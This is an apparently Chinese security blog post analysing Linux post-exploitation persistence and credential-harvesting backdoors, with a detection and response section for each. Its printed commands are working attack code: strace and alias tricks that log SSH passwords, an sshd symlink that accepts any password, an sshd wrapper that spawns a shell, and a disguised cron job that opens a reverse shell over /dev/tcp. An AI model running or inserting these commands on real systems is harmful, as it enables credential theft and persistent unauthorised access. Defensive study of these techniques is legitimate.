---
title: 【安全研究】Linux后渗透常见后门驻留方式分析
url: https://www.secpulse.com/archives/190743.html
source: 安全脉搏
date: 2022-11-10
fetch_date: 2025-10-03T22:12:43.136748
---

# 【安全研究】Linux后渗透常见后门驻留方式分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 【安全研究】Linux后渗透常见后门驻留方式分析

[安全管理](https://www.secpulse.com/archives/category/construction/securityissue)

[安全狗](https://www.secpulse.com/newpage/author?author_id=32873)

2022-11-09

21,556

↑ 点击上方 关注我们

**一**

**引言**

当****RedTeam****拿下了一台服务器并获取到系统较高权限，但不知道服务器的凭证时，RedTeam会采用怎样的技术获取系统凭证呢？又或者，在RedTeam拿下一台服务器，为达到长久控制的目的而专门定制持久化后门（免杀肯定是必须的）的前提下，他们会如何结合系统自身的某些特性，达到持久化控制的效果？

****BlueTeam****在应急响应的过程中，又该如何尽早地排查出这些后门？为尽到“知己知彼，百战不殆”，本文将对Linux下常见的权限维持技术和凭据收集技术进行解析，希望能对从事****攻防对抗研究****的小伙伴有所帮助。

###

**二**

**Strace获取登陆凭证**

**1**

**strace获取登陆凭证原理**

凭证将会通过****strace****追踪到系统sshd进程，并将追踪到的信息保存到log文件，这些信息中包含了系统明文密码以及ssh私钥。

**2**

**strace获取登陆凭证实现**

****strace获取登陆凭证利用********条件********包括：****

* 内核版本>Linux Kernel 3.4支持完全限制或禁用ptrace的功能。
* 具有kernel.yama.ptrace\_scope限制和禁用。

****具体实现****

获取sshd进程明文密码。可使用括号执行程序，然后退出当前shell，并用ssh登录其他主机。

```
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 4096 2> /tmp/.sshd.log &)
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973166.png) 图1

strace捕获到的凭证将会保存在/tmp/.sshd.log文件下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-16679731661.png)图2

**3**

**Strace获取登陆凭证检测响应**

1）使用ps工具查看系统中的strace进程。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973168.png)图3

2）使用kill工具阻断进程运行。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973169.png)图4

**三**

**Alias获取登陆凭证**

**1**

**Alias获取登陆凭证原理**

给指定程序设置命令别名，使运行指定程序时自动strace读写系统调用，收集登录凭证。

**2**

**Alias获取登陆凭证实现**

1）在终端中执行。

```
# 添加命令别名
vi ~/.bashrc或者/etc/bashrc
alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
# 使命令别名立即生效
source ~/.bashrc
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973170.png)图5

2）通过查看日志文件，能看到有系统凭证的信息。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-16679731701.png)图6

**3**

**Alias获取登陆凭证检测响应**

1）使用alias工具即可发现异常

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973171.png)图7

2）打开.bashrc文件，查看并清除后门命令。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-16679731711.png)图8

**四**

**SSH软连接后门**

**1**

**SSH软连接后门原理**

软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），su在pam\_rootok只检测uid 0即认证成功，导致了可以使用任意密码登录。

**2**

**SSH软连接后门实现**

1）在靶机上安装ssh后门，执行。

```
ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345
```

2）攻击机中用ssh终端连接工具，密码随意填写即可实现任意密码登录。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973172.png)图9

笔者在测试环境下还发现有”chsh”、”chfn”等shell程序包含pam\_rootok.so，均能够用于SSH软连接后门的植入。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973177.png)图10

**3**

**SSH软连接后门检测响应**

1）查看系统当前端口状态。

这类后门会开启监听端口，我们可以先查看/etc/pam.d/目录下有哪些文件包含该配置，然后通过管道符找到异常端口及进程，再通过进程找到异常文件、杀掉进程、关闭PAM认证即可。

```
find /etc/pam.d/ |xargs grep "pam_rootok.so"
netstat -antlp |grep -E "su|chsh|chfn|runuser"
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973178.png)图11

2）查看系统登录日志

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973181.png)图12

**五**

**SSH公钥免密登陆后门**

**1**

**公钥免密后门原理**

ssh无密码登录要使用公钥与私钥。linux下可以用ssh-keygen生成公钥/私钥，即利用密钥认证登录。

**2**

**公钥免密登录后门实现**

1）在攻击机上生成公钥文件，“回车”默认配置。

```
ssh-keygen -t rsa
```

2）将攻击机上的id\_rsa.pub文件拷贝至靶机。

```
1.ftp、scp等工具上传至靶机或者U盘植入；
2.将公钥文件放置vps服务器，然后靶机用wget/curl下载；
3.各类可用于远程传输的工具均可（如：nc）。
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-16679731811.png)图13

3）攻击机ssh连接靶机，无需密码认证。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973182.png)图14

**3**

**公钥免密登陆后门检测响应**

1）查看系统当前登录状态。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973183.png)图15

**六**

**SSH wrapper后门**

**1**

**SSH wrapper后门原理**

Linux中init首先启动的是/usr/sbin/sshd，原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。如果这个子进程的标准输入输出已被重定向，那么getpeername能获取到客户端的TCP端口，将会派生给执行sh命令执行的权限。简而言之就是反弹shell，与常见的反弹shell不同的是，**SSH wrapper后门通过长连接反弹shell的方式，使得攻击者在退出终端后仍然能进行连接**。

**2**

**SSH wrapper后门实现**

1）在靶机（服务端）中执行监听，终端中执行。

```
cd /usr/sbin/
mv sshd ../bin/
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart
```

2）在攻击机（客户端）中执行连接命令，获得一个命令执行权限的shell。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973184.png)图16

**3**

**SSH wrapper后门检测响应**

1）查看sshd文件修改状况。

```
ls -al /usr/sbin/sshd
cat /usr/sbin/sshd
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973187.png)图17

2）清除SSH wrapper后门。

通过重装ssh服务清除SSH wrapper后门。

**七**

**Cron后门**

**1**

**Cron后门原理**

crontab命令用于设置周期性被执行的指令，可以把cron设置为开机时自动启动。攻击者将恶意代码或程序隐藏在系统磁盘中，并由计划任务调用时启动它们。

**2**

**Cron后门实现**

1）平平无奇的Cron后门。

```
(crontab -l;echo '*/1 * * * * /bin/bash /tmp/1.sh;/bin/bash --noprofile -i')|crontab -
```

能用crontab-l命令查看到具体内容。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190743-1667973188.png)图18

2）隐蔽的Cron后门。

```
(crontab -l;printf "*/1 * * * * bash -i >& /dev/tcp/ip/port 0>&1;/bin/bash --noprofile -i;rno crontab for `whoami`%100cn")|crontab -
``...